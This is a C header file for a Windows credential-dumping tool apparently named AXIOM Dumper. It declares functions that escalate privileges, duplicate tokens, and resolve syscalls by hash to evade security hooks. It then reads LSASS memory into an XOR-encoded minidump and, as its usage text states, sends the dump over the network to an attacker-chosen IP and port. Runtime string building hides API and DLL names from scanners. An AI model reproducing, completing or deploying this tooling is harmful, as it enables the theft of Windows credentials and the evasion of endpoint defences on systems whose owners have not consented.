#pragma once
#ifndef AXIOM_DUMPER_H
# define AXIOM_DUMPER_H

# include <Windows.h>
# include "Typedefs.h"

# define USAGE_STRING "Usage: %s [/help|/PPcheck <PID>] IP PORT\n\n" \
	"Examples :\n\n" \
	".\%s 192.168.1.20 # Dumps and send data over network to the specified IP and PORT\n" \
	".\%s /PPcheck 720 # Checks protection status of the process identified by PID 720\n" \
	".\%s /help # Print usage info\n"
# define PRINT_USAGE(prog_name) printf(USAGE_STRING, prog_name, prog_name, prog_name, prog_name)

# define ARRAY_SIZE(a) (sizeof(a)/sizeof((a)[0]))
# define RVA(type, base_addr, rva) (type)((ULONG_PTR) base_addr + rva)
# define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
# define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
# define STATUS_SUCCESS 0x00000000
# define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
# define NTDLL_JUMPS_COUNT 5
# define SSN_RANGE 0x1e
# define LDR_POINTER_OFFSET 0x18
# define MODULE_LIST_POINTER_OFFSET 0x10
//# define __DEBUG__ // Uncomment this to enable debugging output

# ifdef __DEBUG__
#  define DEBUG_LOG(...) printf(__VA_ARGS__)
# else
#  define DEBUG_LOG(...) (void)0
# endif

//=============================================================================
//|                                AXIOM_TABLE                                |
//|                       (where I put syscall metadata)                      |
//=============================================================================
typedef struct _AXIOM_TABLE_ENTRY
{
	void* pAddress;
	const char* humanFriendlyName;
	const char* dwHash;
	unsigned __int32 wSystemCall;
	void* wSystemCallAddress;
} AXIOM_TABLE_ENTRY, * PAXIOM_TABLE_ENTRY;

typedef struct _AXIOM_TABLE
{
	PAXIOM_TABLE_ENTRY item;
	struct _AXIOM_TABLE* next;
} AXIOM_TABLE, * PAXIOM_TABLE;

//=============================================================================
//|                               El_Sass magic                               |
//=============================================================================
BOOL El_Sass(HANDLE hProcess, const void** bufferAddress, int* bytesReadAddress);
BOOL ELSASS_ExtractAllCredz(PDUMPCONTEXT dc);
void ELSASS_Append(IN PDUMPCONTEXT dc, IN const PVOID data, IN ULONG32 size, IN UINT xorkey);
void ELSASS_Writeat(IN PDUMPCONTEXT dc, IN ULONG32 rva, IN const PVOID data, IN unsigned size, IN UINT xorkey);
PMODULEINFO ELSASS_ExtractModulesList(PDUMPCONTEXT dc);
PDumpMemoryDescriptor64 ELSASS_ExtractMemoryPages(PDUMPCONTEXT dc, PMODULEINFO module_list);

//=============================================================================
//|                             Dumper internals                              |
//=============================================================================
void AXIOM_PPcheck(char* process_id);
BOOL AXIOM_PrivCheck();
BOOL AXIOM_PrivIncrease(LUID luid);
HANDLE AXIOM_DuplicatePrivilegedToken(LUID luid);
HANDLE AXIOM_HDuplicate();
BOOL AXIOM_Prepare_Syscalls();
BOOL AXIOM_InitAxiomTable(PAXIOM_TABLE_ENTRY newEntry);
BOOL AXIOM_AddToAxiomTable(PAXIOM_TABLE_ENTRY newEntry);
void* AXIOM_GetSyscallAddrByHash(const char* hash);
const int AXIOM_GetSNNByHash(const char* hash);
int AXIOM_NetworkEmitter(const char* ip, int port, unsigned char* buffer, size_t bufferSize);

//=============================================================================
//|                                 EAT stuff                                 |
//=============================================================================
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);

//=============================================================================
//|        Gnagna, your code is unsafe and I won't let you compile --"        |
//=============================================================================
const int drunk_atoi(const char* argv1);
char* drunk_md5(const char* input);
const char* drunk_strcpy(char* dest, const char* src);
const char* drunk_strdup(const char* str);
const int drunk_strcmp(const char* s1, const char* s2);
unsigned char* drunk_memcpy(unsigned char* dest, const unsigned char* src, size_t len);
const char* drunk_wchar_to_cstring(wchar_t* source);

//=============================================================================
//|      Mostly needed to avoid embarqing the "NT*" strings in the binary     |
//=============================================================================
# define STRBUILDER_SEDEBUG 1
# define STRBUILDER_DBGHELP_DLL 2
# define STRBUILDER_MINIDUMP_WRITEDUMP 3
# define STRBUILDER_NTDLL_DLL 4
# define STRBUILDER_LSASRV_DLL 5
const wchar_t* SecretWStrBuilder(const int MODE);

// Yes I recoded that one because otherwise the needed header files mess up everything
void InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a, HANDLE r, PVOID s);

#endif
